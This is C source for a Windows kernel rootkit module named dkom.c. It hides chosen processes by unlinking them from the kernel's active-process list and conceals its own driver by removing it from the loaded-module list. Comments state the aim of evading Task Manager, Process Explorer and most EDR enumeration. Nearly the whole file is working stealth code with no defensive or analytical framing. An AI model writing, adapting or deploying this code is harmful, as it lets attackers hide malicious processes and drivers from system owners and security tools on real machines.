/*==============================================================================
 * rootkit/src/dkom.c
 *------------------------------------------------------------------------------
 * DKOM (Direct Kernel Object Manipulation):
 *   - Process hiding via ActiveProcessLinks unlink/relink
 *   - Driver unlinking from PsLoadedModuleList
 *   - Device object removal
 *
 * PRESERVATION CONTRACT:
 *   hide_process() saves the original FLINK/BLINK pointers in a side table
 *   keyed by PID so unhide_process() can restore them exactly. The target's
 *   own LIST_ENTRY is poisoned (self-referential) to crash any walker that
 *   lands on the hidden entry rather than silently corrupting the list.
 *============================================================================*/
#include "utils.h"

/* Maximum number of simultaneously hidden processes. */
#define MAX_HIDDEN 64

/* Side-table entry for a hidden process. */
typedef struct _HIDDEN_ENTRY {
    ULONG   pid;        /* Process ID */
    ULONG64 flink;      /* Original forward link (LIST_ENTRY*) */
    ULONG64 blink;      /* Original back link (LIST_ENTRY*) */
} HIDDEN_ENTRY;

static HIDDEN_ENTRY g_hidden[MAX_HIDDEN];
static KSPIN_LOCK  g_hidden_lock;
static BOOLEAN     g_dkom_init = FALSE;

/*==============================================================================
 * INITIALIZATION
 *============================================================================*/
VOID dkom_init(VOID) {
    KeInitializeSpinLock(&g_hidden_lock);
    RtlZeroMemory(g_hidden, sizeof(g_hidden));
    g_dkom_init = TRUE;
}

/*==============================================================================
 * INTERNAL: Side-table management
 *============================================================================*/
static HIDDEN_ENTRY* hidden_find(ULONG pid) {
    for (ULONG i = 0; i < MAX_HIDDEN; i++) {
        if (g_hidden[i].pid == pid) return &g_hidden[i];
    }
    return NULL;
}

static HIDDEN_ENTRY* hidden_alloc(ULONG pid) {
    for (ULONG i = 0; i < MAX_HIDDEN; i++) {
        if (g_hidden[i].pid == 0) {
            g_hidden[i].pid = pid;
            return &g_hidden[i];
        }
    }
    return NULL;
}

/*==============================================================================
 * PROCESS LOOKUP BY PID
 *============================================================================*/
PEPROCESS find_process_by_pid(ULONG pid) {
    if (!g_SystemProcess) return NULL;

    PLIST_ENTRY head = rk_active_links(g_SystemProcess);
    PLIST_ENTRY e    = head->Flink;

    while (e && e != head) {
        PEPROCESS proc = (PEPROCESS)((PUCHAR)e - g_EprocOffsets.ActiveProcessLinks);
        if ((ULONG)(ULONG_PTR)rk_process_id(proc) == pid) return proc;
        e = e->Flink;
    }
    return NULL;
}

/*==============================================================================
 * HIDE PROCESS (DKOM Unlink)
 *------------------------------------------------------------------------------
 * Removes the target process from the ActiveProcessLinks circular list.
 * The process becomes invisible to tools that enumerate via PsActiveProcessHead
 * (Task Manager, Process Explorer, `ps` command, etc.).
 *
 * Steps:
 *   1. Locate EPROCESS by PID
 *   2. Acquire spinlock for atomic list manipulation
 *   3. Save original FLINK/BLINK in side table
 *   4. Unlink: FLINK->Blink = BLINK; BLINK->Flink = FLINK
 *   5. Poison own links to self (detects accidental traversal)
 *============================================================================*/
NTSTATUS hide_process(ULONG pid) {
    if (!g_dkom_init) return STATUS_NOT_SUPPORTED;

    PEPROCESS proc = find_process_by_pid(pid);
    if (!proc) return STATUS_NOT_FOUND;

    KIRQL irql;
    KeAcquireSpinLock(&g_hidden_lock, &irql);

    if (hidden_find(pid)) {
        KeReleaseSpinLock(&g_hidden_lock, irql);
        return STATUS_ALREADY_REGISTERED;
    }

    HIDDEN_ENTRY* slot = hidden_alloc(pid);
    if (!slot) {
        KeReleaseSpinLock(&g_hidden_lock, irql);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    PLIST_ENTRY links = rk_active_links(proc);
    slot->flink = (ULONG64)links->Flink;
    slot->blink = (ULONG64)links->Blink;

    /* Standard doubly-linked list unlink. */
    PLIST_ENTRY f = links->Flink;
    PLIST_ENTRY b = links->Blink;
    f->Blink = b;
    b->Flink = f;

    /* Poison our own links: point to self so a walker that lands here
     * crashes loudly (access violation) rather than silently re-linking. */
    links->Flink = (PLIST_ENTRY)&links->Flink;
    links->Blink = (PLIST_ENTRY)&links->Blink;

    KeReleaseSpinLock(&g_hidden_lock, irql);
    return STATUS_SUCCESS;
}

/*==============================================================================
 * UNHIDE PROCESS (DKOM Relink)
 *------------------------------------------------------------------------------
 * Restores a previously hidden process to the ActiveProcessLinks list
 * using the saved FLINK/BLINK pointers.
 *============================================================================*/
NTSTATUS unhide_process(ULONG pid) {
    if (!g_dkom_init) return STATUS_NOT_SUPPORTED;

    KIRQL irql;
    KeAcquireSpinLock(&g_hidden_lock, &irql);

    HIDDEN_ENTRY* slot = hidden_find(pid);
    if (!slot) {
        KeReleaseSpinLock(&g_hidden_lock, irql);
        return STATUS_NOT_FOUND;
    }

    /* Locate EPROCESS through the saved FLINK (still valid). */
    PLIST_ENTRY f = (PLIST_ENTRY)slot->flink;
    PLIST_ENTRY b = (PLIST_ENTRY)slot->blink;
    PEPROCESS proc = (PEPROCESS)((PUCHAR)f - g_EprocOffsets.ActiveProcessLinks);

    PLIST_ENTRY links = rk_active_links(proc);

    /* Relink: restore original pointers. */
    links->Flink = f;
    links->Blink = b;
    f->Blink = links;
    b->Flink = links;

    /* Clear side-table entry. */
    slot->pid = 0;
    slot->flink = slot->blink = 0;

    KeReleaseSpinLock(&g_hidden_lock, irql);
    return STATUS_SUCCESS;
}

/*==============================================================================
 * DRIVER MODULE LIST UNLINK / RELINK
 *------------------------------------------------------------------------------
 * Removes our driver's KLDR_DATA_TABLE_ENTRY from PsLoadedModuleList.
 * This hides the driver from:
 *   - NtQuerySystemInformation(SystemModuleInformation)
 *   - EnumDeviceDrivers (user-mode)
 *   - Most EDR module enumeration
 *
 * Kernel callback-based detection (ETW-TI, image-load notify) still sees
 * the load event at load time.
 *============================================================================*/

/* Unlink our driver from PsLoadedModuleList.
 * Returns the saved KLDR_DATA_TABLE_ENTRY pointer for later relink. */
PVOID hide_driver_from_loaded_modules(PDRIVER_OBJECT drv) {
    if (!drv || !drv->DriverSection) return NULL;

    /* DriverSection points to KLDR_DATA_TABLE_ENTRY.
     * InLoadOrderLinks is at offset 0 of that structure. */
    PLIST_ENTRY entry_links = (PLIST_ENTRY)drv->DriverSection;

    PLIST_ENTRY f = entry_links->Flink;
    PLIST_ENTRY b = entry_links->Blink;
    f->Blink = b;
    b->Flink = f;

    /* Leave our own links intact so we can relink later. */
    return drv->DriverSection;
}

/* Relink driver into PsLoadedModuleList at a stable position
 * (before the current first entry). */
VOID relink_driver_loaded_modules(PVOID saved_entry) {
    if (!saved_entry) return;

    PLIST_ENTRY e = (PLIST_ENTRY)saved_entry;
    PLIST_ENTRY head = PsLoadedModuleList;
    PLIST_ENTRY first = head->Flink;

    e->Flink = first;
    e->Blink = head;
    first->Blink = e;
    head->Flink  = e;
}